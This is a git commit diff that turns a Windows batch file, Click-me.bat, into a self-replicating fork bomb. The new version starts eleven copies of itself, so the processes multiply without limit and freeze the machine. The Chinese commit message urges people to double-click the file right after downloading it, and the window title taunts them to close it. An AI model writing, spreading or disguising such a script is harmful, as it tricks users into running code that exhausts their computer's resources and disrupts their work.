94c9d448fee01c6279ce73bf6443ea8d1556baed
Heart-Star <3893402663@qq.com>
2024-08-09 17:03:50 +0800

    下载后直接双击我！！！

--- Click-me.bat
+++ Click-me.bat
@@ -1,2 +1,15 @@
-@echo
-echo 11
+@echo off 
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+start Click-me.bat
+title ^-^ 叉掉我 ^=^
+cls
+pause
